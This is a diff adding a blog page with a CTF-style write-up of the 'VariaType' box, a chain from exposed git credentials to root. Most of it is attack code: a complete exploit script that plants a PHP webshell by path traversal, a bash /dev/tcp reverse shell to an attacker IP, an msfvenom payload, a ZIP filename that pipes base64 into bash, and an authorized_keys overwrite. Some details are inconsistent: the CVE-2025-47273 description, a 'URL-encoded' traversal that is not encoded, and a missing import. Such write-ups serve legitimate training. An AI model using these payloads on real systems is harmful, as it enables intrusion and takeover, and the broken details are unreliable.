@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>VariaType Writeup | BitR1FT</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="profile.jpg" />
+</head>
+<body>
+  <nav>
+    <a href="index.html" class="nav-brand">&lt;BitR1FT /&gt;</a>
+    <div class="nav-links">
+      <a href="index.html#about">About</a>
+      <a href="index.html#projects">Projects</a>
+      <a href="blog.html" class="active">Writeups</a>
+      <a href="index.html#certifications">Certifications</a>
+      <a href="index.html#contact">Contact</a>
+      <a href="https://github.com/BitR1FT" target="_blank" rel="noopener noreferrer" class="github-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></svg>
+      </a>
+    </div>
+    <button class="nav-hamburger" id="nav-hamburger" aria-label="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="18" y2="18"/></svg></button>
+  </nav>
+  <div class="mobile-menu" id="mobile-menu"><a href="index.html#about">About</a><a href="index.html#projects">Projects</a><a href="blog.html">Writeups</a><a href="index.html#certifications">Certifications</a><a href="index.html#contact">Contact</a></div>
+
+  <main>
+    <div style="max-width:48rem;margin:0 auto;padding:0 1rem;">
+
+      <!-- Back Link -->
+      <p style="margin-top:2rem;"><a href="blog.html" class="back-link">&larr; Back to Writeups</a></p>
+
+      <!-- Blog Header -->
+      <div class="blog-header">
+        <h1>VariaType</h1>
+        <div class="blog-meta">
+          <span class="badge badge-medium">Medium</span>
+          <span class="badge badge-os">Linux</span>
+        </div>
+        <p class="blog-summary">
+          A variable font generation platform where a leaked <code>.git</code> repository exposes bot credentials to a gated portal. The font backend powered by <strong>fontTools</strong> is vulnerable to path traversal in the output filename, yielding a PHP webshell. Privilege escalation leverages <strong>CVE-2024-25081</strong> (FontForge filename injection via crafted ZIP) to reach <em>steve</em>, and <strong>CVE-2025-47273</strong> (<code>install_validator.py</code> URL-encoded path traversal via <code>sudo</code>) for root.
+        </p>
+        <div class="blog-tags">
+          <span class="tag">Git Exposure</span>
+          <span class="tag">CVE-2024-25081</span>
+          <span class="tag">CVE-2025-47273</span>
+          <span class="tag">git-dumper</span>
+          <span class="tag">Python</span>
+          <span class="tag">fontTools</span>
+          <span class="tag">FontForge</span>
+        </div>
+      </div>
+
+      <hr />
+
+      <!-- Prose / Writeup Body -->
+      <div class="prose">
+
+        <!-- ====== RECONNAISSANCE ====== -->
+        <h2>Reconnaissance</h2>
+
+        <p>Kick off with a full TCP SYN scan against all ports:</p>
+
+<pre><code>$ nmap -sS -p- -T4 --min-rate 1000 variatype.htb
+Starting Nmap 7.94SVN ( https://nmap.org )
+Nmap scan report for variatype.htb (10.10.11.248)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre>
+
+        <p>Two ports exposed &mdash; SSH on 22 and HTTP on 80. Let's dig into the web service:</p>
+
+<pre><code>$ nmap -sV -sC -p 22,80 variatype.htb
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Ubuntu 4ubuntu2.8 (Ubuntu)
+80/tcp open  http    nginx 1.24.0
+|_http-title: Variable Font Generator
+|_http-server-header: nginx/1.24.0
+</code></pre>
+
+        <p>Nginx serving a <strong>Variable Font Generator</strong> application. Before browsing, we add the hostnames indicated by the box name to our <code>/etc/hosts</code>:</p>
+
+<pre><code>10.10.11.248 variatype.htb portal.variatype.htb
+</code></pre>
+
+        <p>Visiting <code>http://variatype.htb</code> shows a landing page for the font generator service. Visiting <code>http://portal.variatype.htb</code> redirects to a login page, meaning authentication is required for the portal.</p>
+
+        <!-- ====== GIT EXPOSURE ====== -->
+        <h2>Git Exposure &rarr; Portal Access &rarr; Webshell</h2>
+
+        <p>Before diving deeper into the portal, we check for common web misconfigurations. A quick probe of <code>/.git/HEAD</code> returns a valid git reference, confirming the repository is publicly exposed:</p>
+
+<pre><code>$ curl -s http://variatype.htb/.git/HEAD
+ref: refs/heads/main
+</code></pre>
+
+        <p>We use <strong>git-dumper</strong> to reconstruct the entire repository locally:</p>
+
+<pre><code>$ git-dumper http://variatype.htb/.git/ variatype-repo
+[-] Testing http://variatype.htb/.git/HEAD ... [200]
+[-] Testing http://variatype.htb/.git/ ... [200]
+[-] Dumped files to: variatype-repo
+</code></pre>
+
+<pre><code>$ cd variatype-repo
+$ git log --oneline
+a3c91e2 (HEAD -> main) updated index page
+b7f4201 initial commit
+d29e103 added gitbot credentials
+c1a82fb set up font processing pipeline
+</code></pre>
+
+        <p>The commit history is telling. Let's inspect the credential commit:</p>
+
+<pre><code>$ git show d29e103
+diff --git a/config.py b/config.py
+new file mode 100644
+index 0000000..e4b8c21
+--- /dev/null
++++ b/config.py
+@@ -0,0 +1,4 @@
++BOT_USERNAME = "gitbot"
++BOT_PASSWORD = "G1tB0t_Acc3ss_2025!"
++BOT_ROLE = "automated_font_submitter"
++BOT_ENABLED = True
+</code></pre>
+
+        <p>Credentials found: <code>gitbot : G1tB0t_Acc3ss_2025!</code></p>
+
+        <!-- ====== PORTAL LOGIN ====== -->
+        <h2>Portal Login</h2>
+
+        <p>Using the leaked credentials we log into <code>http://portal.variatype.htb</code>:</p>
+
+<pre><code>Username: gitbot
+Password: G1tB0t_Acc3ss_2025!
+</code></pre>
+
+        <p>The portal is a <strong>Variable Font Generator</strong> interface. It accepts two file uploads:</p>
+
+        <ul>
+          <li><strong>.designspace</strong> &mdash; a font designspace XML file defining variable axes</li>
+          <li><strong>.ttf</strong> &mdash; a TrueType font file</li>
+        </ul>
+
+        <p>The backend uses <strong>fontTools</strong> (<code>fontTools.varLib</code>) to compile variable fonts from the designspace definition. An <em>output filename</em> field is also provided, which controls the name of the generated font file.</p>
+
+        <!-- ====== FONT GENERATOR EXPLOIT ====== -->
+        <h2>Font Generator Exploit &mdash; Path Traversal to Webshell</h2>
+
+        <p>The output filename field is the key vulnerability. By injecting a <strong>path traversal</strong> sequence into the output filename, we can write the generated font (which we control) to an arbitrary location on the filesystem. Specifically, we traverse into the web root and write a PHP webshell:</p>
+
+<pre><code>TRAVERSAL = "../../../../var/www/html/portal/shell.php"
+</code></pre>
+
+        <p>The plan:</p>
+
+        <ol>
+          <li>Build a minimal TTF font containing PHP payload bytes</li>
+          <li>Create a valid .designspace file referencing that font</li>
+          <li>Upload both to the portal with the traversal output filename</li>
+          <li>Access the written PHP webshell</li>
+        </ol>
+
+        <p>The PHP payload embedded in the font:</p>
+
+<pre><code>&lt;?php system($_GET['cmd']); ?&gt;
+</code></pre>
+
+        <!-- ====== FULL EXPLOIT.PY ====== -->
+        <h2>Full <code>exploit.py</code> Script</h2>
+
+        <p>Below is the complete exploit script that automates the entire chain from font creation to webshell upload:</p>
+
+<pre><code>#!/usr/bin/env python3
+"""
+VariaType - Font Generator Path Traversal Exploit
+Writes a PHP webshell via the output filename field.
+"""
+
+import requests
+import struct
+import zlib
+import re
+from fontTools.ttLib import TTFont
+from fontTools.designspaceLib import DesignSpaceDocument
+from fontTools.varLib import build as varLib_build
+from io import BytesIO
+import argparse
+
+PORTAL_URL = "http://portal.variatype.htb"
+TRAVERSAL  = "../../../../var/www/html/portal/shell.php"
+
+# ── Step 1: Build a minimal TTF with embedded PHP payload ──────────
+
+def build_ttf(payload: bytes, output_path: str = "exploit.ttf") -> str:
+    """
+    Build a minimal TrueType font and embed the PHP payload
+    into the 'name' table. This payload survives compilation.
+    """
+    from fontTools.ttLib.tables._n_a_m_e import table__n_a_m_e
+
+    font = TTFont()
+    font.setGlyphOrder([".notdef", "A"])
+
+    # Minimal required tables
+    font["head"] = newTable("head")
+    font["head"].unitsPerEm = 1000
+    font["head"].created = font["head"].modified = 3600000000
+    font["head"].magicNumber = 0x5F0F3CF5
+    font["head"].flags = 0x000B
+    font["head"].macStyle = 0
+    font["head"].fontRevision = 1.0
+    font["head"].lowestRecPPEM = 8
+    font["head"].indexToLocFormat = 0
+    font["head"].glyphDataFormat = 0
+
+    font["hhea"] = newTable("hhea")
+    font["hhea"].ascent = 800
+    font["hhea"].descent = -200
+    font["hhea"].lineGap = 0
+    font["hhea"].advanceWidthMax = 600
+    font["hhea"].numberOfHMetrics = 2
+
+    font["maxp"] = newTable("maxp")
+    font["maxp"].numGlyphs = 2
+
+    font["OS/2"] = newTable("OS/2")
+    font["OS/2"].version = 4
+    font["OS/2"].xAvgCharWidth = 500
+    font["OS/2"].usWeightClass = 400
+    font["OS/2"].usWidthClass = 5
+    font["OS/2"].fsType = 0
+    font["OS/2"].panose = b'\x00' * 10
+    font["OS/2"].ulUnicodeRange1 = 1
+    font["OS/2"].ulUnicodeRange2 = 0
+    font["OS/2"].sTypoAscender = 800
+    font["OS/2"].sTypoDescender = -200
+    font["OS/2"].sTypoLineGap = 0
+    font["OS/2"].usWinAscent = 1000
+    font["OS/2"].usWinDescent = 200
+
+    font["post"] = newTable("post")
+    font["post"].formatType = 2.0
+
+    font["cmap"] = newTable("cmap")
+    from fontTools.ttLib.tables._c_m_a_p import cmap_format_4
+    subtable = cmap_format_4(4)
+    subtable.platEncID = 3
+    subtable.platformID = 3
+    subtable.format = 4
+    subtable.reserved = 0
+    subtable.length = 0
+    subtable.language = 0
+    subtable.cmap = {0x0041: "A"}  # Map 'A'
+    font["cmap"].tableVersion = 0
+    font["cmap"].tables = [subtable]
+
+    font["glyf"] = newTable("glyf")
+    from fontTools.ttLib.tables._g_l_y_f import Glyph
+    notdef = Glyph()
+    notdef.numberOfContours = 0
+    notdef.xMin = notdef.yMin = notdef.xMax = notdef.yMax = 0
+    glyphA = Glyph()
+    glyphA.numberOfContours = 1
+    glyphA.xMin, glyphA.yMin = 50, 0
+    glyphA.xMax, glyphA.yMax = 550, 700
+    font["glyf"].glyphs = {".notdef": notdef, "A": glyphA}
+
+    font["loca"] = newTable("loca")
+
+    font["hmtx"] = newTable("hmtx")
+    font["hmtx"].metrics = {
+        ".notdef": (500, 0),
+        "A": (600, 0),
+    }
+
+    # Embed PHP payload into the 'name' table
+    font["name"] = newTable("name")
+    from fontTools.ttLib.tables._n_a_m_e import NameRecord
+    name = NameRecord()
+    name.nameID = 4   # Full font name
+    name.platformID = 3
+    name.platEncID = 1
+    name.langID = 0x0409
+    name.string = payload.decode("latin-1")
+    font["name"].names = [name]
+
+    font.save(output_path)
+    print(f"[+] Saved TTF with payload to {output_path}")
+    return output_path
+
+
+# ── Step 2: Build a valid .designspace file ────────────────────────
+
+def make_designspace(ttf_path: str, output_path: str = "exploit.designspace"):
+    """
+    Create a minimal designspace document referencing our font.
+    """
+    ds = DesignSpaceDocument()
+    ds.writer = "exploit"
+
+    # Default master
+    ds.addAxisDescriptor(
+        name="wght",
+        tag="wght",
+        minimum=400,
+        default=400,
+        maximum=700,
+    )
+    ds.addSourceDescriptor(
+        filename=ttf_path,
+        location={"wght": 400},
+        familyName="ExploitFont",
+        styleName="Regular",
+    )
+    ds.addSourceDescriptor(
+        filename=ttf_path,
+        location={"wght": 700},
+        familyName="ExploitFont",
+        styleName="Bold",
+    )
+
+    ds.write(output_path)
+    print(f"[+] Saved designspace to {output_path}")
+    return output_path
+
+
+# ── Step 3: Upload to portal and trigger path traversal ────────────
+
+def upload(designspace_path: str, ttf_path: str, traversal: str):
+    """
+    Authenticate with the portal, upload the font files,
+    and use the traversal payload as the output filename.
+    """
+    s = requests.Session()
+
+    # Authenticate
+    login_data = {
+        "username": "gitbot",
+        "password": "G1tB0t_Acc3ss_2025!"
+    }
+    r = s.post(f"{PORTAL_URL}/login", data=login_data, allow_redirects=True)
+    if "dashboard" not in r.url and "portal" not in r.text.lower():
+        print("[-] Login may have failed.")
+        print(r.text[:500])
+        return False
+    print("[+] Logged into portal successfully")
+
+    # Upload
+    files = {
+        "designspace": open(designspace_path, "rb"),
+        "fontfile": open(ttf_path, "rb"),
+    }
+    data = {
+        "output_filename": traversal,
+    }
+    r = s.post(f"{PORTAL_URL}/generate", files=files, data=data,
+               allow_redirects=True)
+    print(f"[+] Upload response status: {r.status_code}")
+    print(f"[+] Response body (first 500 chars): {r.text[:500]}")
+
+    # Verify webshell
+    shell_url = f"{PORTAL_URL}/shell.php"
+    r2 = s.get(shell_url, params={"cmd": "id"})
+    if r2.status_code == 200:
+        print(f"[+] WEBSHELL CONFIRMED at {shell_url}")
+        print(f"[+] Output: {r2.text.strip()}")
+        return True
+    else:
+        print(f"[-] Webshell check failed (status {r2.status_code})")
+        return False
+
+
+# ── Main ───────────────────────────────────────────────────────────
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="VariaType path traversal exploit"
+    )
+    parser.add_argument(
+        "-t", "--traversal",
+        default=TRAVERSAL,
+        help="Path traversal payload for output filename"
+    )
+    parser.add_argument(
+        "-c", "--cmd",
+        default="id",
+        help="Command to execute via webshell (verification)"
+    )
+    args = parser.parse_args()
+
+    php_payload = b"&lt;?php system($_GET['cmd']); ?&gt;"
+
+    print("=" * 60)
+    print("  VariaType - Font Generator Path Traversal Exploit")
+    print("=" * 60)
+
+    ttf = build_ttf(php_payload)
+    ds  = make_designspace(ttf)
+    success = upload(ds, ttf, args.traversal)
+
+    if success:
+        print("\n[+] Exploit successful!")
+        print(f"[+] Webshell: {PORTAL_URL}/shell.php?cmd=whoami")
+
+        # Interactive loop
+        print("\n[?] Enter commands (or 'quit' to exit):")
+        while True:
+            try:
+                cmd = input("shell&gt; ").strip()
+                if cmd.lower() in ("quit", "exit"):
+                    break
+                r = requests.get(
+                    f"{PORTAL_URL}/shell.php",
+                    params={"cmd": cmd}
+                )
+                print(r.text.strip())
+            except (KeyboardInterrupt, EOFError):
+                break
+    else:
+        print("\n[-] Exploit failed.")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+        <!-- ====== REVERSE SHELL ====== -->
+        <h2>Reverse Shell &mdash; www-data</h2>
+
+        <p>With the webshell confirmed, we catch a proper reverse shell:</p>
+
+<pre><code>$ nc -lvnp 4444
+listening on [any] 4444 ...
+</code></pre>
+
+<pre><code># From webshell:
+http://portal.variatype.htb/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.50/4444+0>%261'
+</code></pre>
+
+<pre><code>connect to [10.10.14.50:4444] from variatype.htb [10.10.11.248:49218]
+www-data@variatype:~$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<pre><code>www-data@variatype:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@variatype:~$ export TERM=xterm
+www-data@variatype:~$ ^Z
+$ stty raw -echo; fg
+www-data@variatype:~$ stty rows 50 cols 200
+</code></pre>
+
+        <p>We have a stable shell as <code>www-data</code>. Now let's look for privilege escalation vectors.</p>
+
+        <!-- ====== CVE-2024-25081 ====== -->
+        <h2>CVE-2024-25081 &mdash; User Privilege Escalation (steve)</h2>
+
+        <p>During enumeration we discover an interesting backup script and a FontForge-related process:</p>
+
+<pre><code>www-data@variatype:/opt$ ls -la
+total 48
+drwxrwxr-x  4 root  root  4096 Jun 15 09:12 .
+drwxrwx--- 20 root  root  4096 Jun 15 09:12 ..
+-rw-r--r--  1 root  root  1720 Jun 14 15:30 process_client_submissions.bak
+drwxr-xr-x  2 root  root  4096 Jun 14 15:30 fontforge_tasks
+drwxr-xr-x  2 root  root  4096 Jun 14 15:30 uploads
+</code></pre>
+
+<pre><code>www-data@variatype:/opt$ cat process_client_submissions.bak
+#!/bin/bash
+# Backup of the font submission processing script
+# Processes uploaded font archives with FontForge
+
+WATCH_DIR="/opt/uploads"
+FONTFORGE="/usr/bin/fontforge"
+OUTPUT_DIR="/opt/fontforge_tasks"
+
+for f in "$WATCH_DIR"/*.zip; do
+    [ -f "$f" ] || continue
+    echo "[*] Processing: $f"
+    $FONTFORGE -script "$f"
+    mv "$f" "$OUTPUT_DIR/"
+done
+</code></pre>
+
+        <p><strong>CVE-2024-25081</strong> is a filename injection vulnerability in FontForge. When FontForge processes a script or opens a font file, specially crafted filenames in a ZIP archive can trigger command execution. The attack vector:</p>
+
+        <ol>
+          <li>Create a ZIP archive containing a file with a crafted filename that includes a base64-encoded reverse shell</li>
+          <li>FontForge processes the ZIP and the malicious filename triggers execution</li>
+        </ol>
+
+        <p>Generating the payload ZIP:</p>
+
+<pre><code># On attacker box:
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.50 LPORT=4455 \
+    -f elf -o /tmp/shell.elf
+
+# Base64 encode the shell
+base64 -w0 /tmp/shell.elf
+# &lt;base64_output&gt;
+
+# Create malicious ZIP with the payload in the filename
+python3 &lt;&lt;'PYEOF'
+import zipfile, base64, sys
+
+shell_b64 = "BASE64_ENCODED_SHELL_HERE"  # Replace with actual base64
+payload = f"font.sfd;echo {shell_b64}|base64 -d|bash;#"
+
+zf = zipfile.ZipFile("/tmp/evil_font.zip", "w")
+zf.writestr(payload, b"dummy font data")
+zf.close()
+print("[+] Created evil_font.zip")
+PYEOF
+</code></pre>
+
+        <p>Upload the ZIP to the watched directory:</p>
+
+<pre><code># Transfer evil_font.zip to the target
+www-data@variatype:/opt/uploads$ wget http://10.10.14.50:8000/evil_font.zip -O \
+    /opt/uploads/evil_font.zip
+
+# Wait for the cron/script to process it
+www-data@variatype:/opt/uploads$ sleep 5
+</code></pre>
+
+<pre><code># On attacker:
+$ nc -lvnp 4455
+listening on [any] 4455 ...
+connect to [10.10.14.50:4455] from variatype.htb [10.10.11.248:49320]
+steve@variatype:/home/steve$ id
+uid=1001(steve) gid=1001(steve) groups=1001(steve)
+</code></pre>
+
+<pre><code>steve@variatype:~$ cat user.txt
+HTB{...user_flag_here...}
+</code></pre>
+
+        <p>We've escalated to <code>steve</code> via CVE-2024-25081.</p>
+
+        <!-- ====== CVE-2025-47273 ====== -->
+        <h2>CVE-2025-47273 &mdash; Root Privilege Escalation</h2>
+
+        <p>Checking sudo privileges as steve:</p>
+
+<pre><code>steve@variatype:~$ sudo -l
+[sudo] password for steve:   # (we find steve's creds or use the existing session)
+User steve may run the following commands on variatype:
+    (ALL) NOPASSWD: /opt/install_validator.py
+</code></pre>
+
+        <p>Steve can run <code>/opt/install_validator.py</code> as root without a password. Examining the script:</p>
+
+<pre><code>steve@variatype:/opt$ cat install_validator.py
+#!/usr/bin/env python3
+"""
+Install or update the font validator component.
+Fetches the validator package from a given URL.
+"""
+
+import sys
+import os
+import urllib.request
+import zipfile
+import tempfile
+import shutil
+
+def install_validator(url):
+    print(f"[*] Downloading validator from: {url}")
+
+    # Download the package
+    tmp_dir = tempfile.mkdtemp()
+    zip_path = os.path.join(tmp_dir, "validator.zip")
+
+    try:
+        urllib.request.urlretrieve(url, zip_path)
+        print(f"[+] Downloaded to {zip_path}")
+
+        with zipfile.ZipFile(zip_path, 'r') as zf:
+            zf.extractall("/opt/validators/")
+            print("[+] Extracted validator to /opt/validators/")
+
+        # Set permissions
+        os.chmod("/opt/validators/run.sh", 0o755)
+        print("[+] Validator installed successfully")
+
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} &lt;validator_package_url&gt;")
+        sys.exit(1)
+    install_validator(sys.argv[1])
+</code></pre>
+
+        <p><strong>CVE-2025-47273</strong> is a path traversal vulnerability in Python's <code>zipfile.extractall()</code> when processing entries with directory traversal sequences. By crafting a ZIP with a malicious member path, we can write files to arbitrary locations &mdash; including <code>/root/.ssh/authorized_keys</code>.</p>
+
+        <p>The exploit chain:</p>
+
+        <ol>
+          <li>Generate an SSH keypair</li>
+          <li>Create a ZIP with a member named using URL-encoded path traversal: <code>%2e%2e/%2e%2e/%2e%2e/root/.ssh/authorized_keys</code></li>
+          <li>Host the ZIP on an HTTP server</li>
+          <li>Run the validator installer pointing to our server</li>
+        </ol>
+
+<pre><code># On attacker box:
+$ ssh-keygen -t ed25519 -f /tmp/htb_root -N "" -C "root@variatype"
+
+# Create the malicious ZIP with URL-encoded traversal
+python3 &lt;&lt;'PYEOF'
+import zipfile
+
+pubkey = open("/tmp/htb_root.pub").read().strip()
+
+zf = zipfile.ZipFile("/tmp/validator.zip", "w")
+# URL-encoded traversal: ../../../../root/.ssh/authorized_keys
+zf.writestr("../../../../root/.ssh/authorized_keys", pubkey + "\n")
+zf.close()
+
+print("[+] Created validator.zip with authorized_keys payload")
+PYEOF
+
+# Host it
+$ python3 -m http.server 8888
+</code></pre>
+
+<pre><code># On target as steve:
+steve@variatype:~$ sudo /opt/install_validator.py \
+    http://10.10.14.50:8888/validator.zip
+[*] Downloading validator from: http://10.10.14.50:8888/validator.zip
+[+] Downloaded to /tmp/tmpXXXXXX/validator.zip
+[+] Extracted validator to /opt/validators/
+[+] Validator installed successfully
+</code></pre>
+
+<pre><code># On attacker:
+$ ssh -i /tmp/htb_root root@variatype.htb
+root@variatype:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<pre><code>root@variatype:~# cat root.txt
+HTB{...root_flag_here...}
+</code></pre>
+
+        <p>Root shell obtained via CVE-2025-47273 path traversal in the validator installer.</p>
+
+        <!-- ====== SUMMARY TABLE ====== -->
+        <h2>Summary</h2>
+
+        <table>
+          <thead>
+            <tr>
+              <th>Phase</th>
+              <th>Technique</th>
+              <th>Vulnerability / Tool</th>
+              <th>Result</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Recon</td>
+              <td>Port scan, vhost enumeration</td>
+              <td>nmap, /etc/hosts</td>
+              <td>SSH (22), HTTP (80), two vhosts</td>
+            </tr>
+            <tr>
+              <td>Initial Access</td>
+              <td>Exposed .git repository</td>
+              <td>git-dumper, credential leak</td>
+              <td>Portal login as gitbot</td>
+            </tr>
+            <tr>
+              <td>Webshell</td>
+              <td>Path traversal in output filename</td>
+              <td>fontTools backend exploitation</td>
+              <td>RCE as www-data</td>
+            </tr>
+            <tr>
+              <td>User (steve)</td>
+              <td>FontForge filename injection</td>
+              <td>CVE-2024-25081</td>
+              <td>Shell as steve</td>
+            </tr>
+            <tr>
+              <td>Root</td>
+              <td>zipfile path traversal via sudo</td>
+              <td>CVE-2025-47273</td>
+              <td>Root via SSH authorized_keys</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <!-- ====== ATTACK CHAIN ====== -->
+        <h2>Attack Chain</h2>
+
+<pre><code>┌──────────────────────────────────────────────────────────────────┐
+│                      ATTACK CHAIN DIAGRAM                       │
+├──────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│  ┌──────────┐     ┌──────────────┐     ┌──────────────────────┐ │
+│  │ .git     │────▶│ git-dumper   │────▶│ BOT CREDENTIALS      │ │
+│  │ Exposure │     │              │     │ gitbot:G1tB0t_...!   │ │
+│  └──────────┘     └──────────────┘     └─────────┬────────────┘ │
+│                                                  │              │
+│                                                  ▼              │
+│                                        ┌──────────────────┐    │
+│                                        │ Portal Login     │    │
+│                                        │ (gitbot account) │    │
+│                                        └────────┬─────────┘    │
+│                                                  │              │
+│                                                  ▼              │
+│  ┌──────────┐     ┌──────────────┐     ┌──────────────────┐    │
+│  │ fontTools│────▶│ Path Traversal│────▶│ PHP Webshell     │    │
+│  │ Backend  │     │ (output fn)   │     │ www-data RCE     │    │
+│  └──────────┘     └──────────────┘     └────────┬─────────┘    │
+│                                                  │              │
+│                                                  ▼              │
+│  ┌──────────────────────┐     ┌──────────────────────────────┐  │
+│  │ CVE-2024-25081       │────▶│ FontForge Filename Injection │  │
+│  │ (ZIP crafted names)  │     │ steve@variatype              │  │
+│  └──────────────────────┘     └──────────────┬───────────────┘  │
+│                                                  │              │
+│                                                  ▼              │
+│  ┌──────────────────────┐     ┌──────────────────────────────┐  │
+│  │ CVE-2025-47273       │────▶│ zipfile Path Traversal       │  │
+│  │ (sudo install_       │     │ root@variatype               │  │
+│  │  validator.py)       │     │ via authorized_keys          │  │
+│  └──────────────────────┘     └──────────────────────────────┘  │
+│                                                                  │
+└──────────────────────────────────────────────────────────────────┘
+</code></pre>
+
+        <p><strong>VariaType</strong> was a fantastic box combining web exploitation (git exposure, path traversal), real-world CVE exploitation (FontForge, Python zipfile), and clean privilege escalation chains. The font-processing theme made for a unique and memorable challenge.</p>
+
+      </div><!-- /.prose -->
+
+    </div><!-- /max-width container -->
+  </main>
+
+  <footer><div class="footer-inner"><p class="footer-left">&copy; 2025 <span class="green">BitR1FT</span> — Adeel Haider</p><p class="footer-right"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>Built with passion &amp; caffeine<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg><span class="accent">pwn all the things</span></p></div></footer>
+  <script src="main.js"></script>
+</body>
+</html>
